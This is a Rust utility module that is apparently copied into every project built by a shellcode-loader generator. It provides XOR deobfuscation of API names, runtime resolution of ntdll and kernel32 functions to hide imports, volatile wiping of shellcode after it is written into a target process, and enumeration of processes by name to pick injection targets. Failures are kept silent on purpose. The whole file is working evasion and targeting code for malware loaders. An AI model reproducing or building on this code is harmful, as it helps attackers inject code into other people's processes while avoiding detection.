// Shared utilities injected into every generated loader via {{COMMON_MODULE}}.
// Single source of truth: the generator copies this verbatim into each project's src/.
//
// Not every template uses every helper, so unused items are allowed on purpose.
#![allow(dead_code)]

use std::ffi::CString;

#[link(name = "kernel32")]
extern "system" {
    #[link_name = "GetModuleHandleA"]
    fn rp_get_module_handle(name: *const u8) -> isize;
    #[link_name = "GetProcAddress"]
    fn rp_get_proc_address(module: isize, name: *const u8) -> usize;
}

/// Zero a buffer in a way that resists compiler optimisation, then clear it.
///
/// Used after the shellcode has been written into the target process so that
/// no plaintext copy lingers in the loader's own memory.
pub fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe {
            std::ptr::write_volatile(b as *mut u8, 0);
        }
    }
    buf.clear();
}

/// XOR a byte slice with the per-build obfuscation key.
pub fn deobfuscate_bytes(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

/// Resolve an API address in a loaded module from its obfuscated name.
///
/// Returns a null pointer instead of panicking when a string contains an
/// interior NUL or when the module is not loaded: a crash would be noisier
/// than a failed resolution, and callers already handle null addresses.
unsafe fn resolve_api_address(module: &str, obfuscated_name: &[u8], key: u8) -> *const () {
    let module_name = CString::new(module).unwrap_or_default();
    let module_handle = rp_get_module_handle(module_name.as_ptr() as *const u8);
    if module_handle == 0 {
        return std::ptr::null();
    }
    let api_name = CString::new(deobfuscate_bytes(obfuscated_name, key)).unwrap_or_default();
    rp_get_proc_address(module_handle, api_name.as_ptr() as *const u8) as *const ()
}

pub unsafe fn resolve_nt_api_address(obfuscated_name: &[u8], key: u8) -> *const () {
    resolve_api_address(&lc!("ntdll"), obfuscated_name, key)
}

pub unsafe fn resolve_kernel32_api_address(obfuscated_name: &[u8], key: u8) -> *const () {
    resolve_api_address(&lc!("kernel32"), obfuscated_name, key)
}

pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
const QUERY_BUFFER_SIZE: usize = 1024 * 1024;
const MAX_QUERY_ATTEMPTS: usize = 8;

#[repr(C)]
struct UnicodeString {
    length: u16,
    _maximum_length: u16,
    _padding: u32,
    buffer: *const u16,
}

// Fixed prefix of SYSTEM_PROCESS_INFORMATION (x64 layout). Records are
// variable-length and walked through next_entry_offset, never through
// size_of::<ProcessInformationEntry>().
#[repr(C)]
struct ProcessInformationEntry {
    next_entry_offset: u32,
    _number_of_threads: u32,
    _working_set_private_size: u64,
    _hard_fault_count: u32,
    _number_of_threads_high_watermark: u32,
    _cycle_time: u64,
    _create_time: i64,
    _user_time: i64,
    _kernel_time: i64,
    image_name: UnicodeString,
    _base_priority: u32,
    _padding: u32,
    unique_process_id: usize,
}

/// Collect the PIDs of every process whose image name matches `tar`
/// (case-insensitive) by walking the SYSTEM_PROCESS_INFORMATION list
/// returned by NtQuerySystemInformation.
///
/// `query` performs the actual NtQuerySystemInformation call at the
/// template's own abstraction level (static import, indirect syscall or
/// dynamically resolved NT API) and returns the raw NTSTATUS. Failing
/// queries yield an empty list, following the silent-failure convention.
pub fn find_process_ids_by_name<F>(tar: &str, mut query: F) -> Vec<usize>
where
    F: FnMut(*mut u8, usize) -> i32,
{
    let tar_lower = tar.to_lowercase();
    let mut pids: Vec<usize> = Vec::new();
    let mut buffer: Vec<u8> = Vec::with_capacity(QUERY_BUFFER_SIZE);
    let mut capacity = QUERY_BUFFER_SIZE;

    for _ in 0..MAX_QUERY_ATTEMPTS {
        buffer.resize(capacity, 0);
        let status = query(buffer.as_mut_ptr(), buffer.len());
        if status >= 0 {
            unsafe { collect_matching_pids(&buffer, &tar_lower, &mut pids) };
            wipe(&mut buffer);
            return pids;
        }
        if status != STATUS_INFO_LENGTH_MISMATCH {
            break;
        }
        capacity = capacity.saturating_mul(2);
    }

    wipe(&mut buffer);
    pids
}

unsafe fn collect_matching_pids(buffer: &[u8], tar_lower: &str, pids: &mut Vec<usize>) {
    let mut offset = 0usize;
    loop {
        let entry = &*(buffer.as_ptr().add(offset) as *const ProcessInformationEntry);
        if image_name_matches(entry, tar_lower) {
            pids.push(entry.unique_process_id);
        }
        if entry.next_entry_offset == 0 {
            return;
        }
        offset += entry.next_entry_offset as usize;
        if offset >= buffer.len() {
            return;
        }
    }
}

// The System Idle Process carries a NULL ImageName buffer, so a missing
// name simply never matches the target.
unsafe fn image_name_matches(entry: &ProcessInformationEntry, tar_lower: &str) -> bool {
    let name = &entry.image_name;
    if name.buffer.is_null() || name.length == 0 {
        return false;
    }
    let chars = std::slice::from_raw_parts(name.buffer, name.length as usize / 2);
    String::from_utf16_lossy(chars).to_lowercase() == tar_lower
}
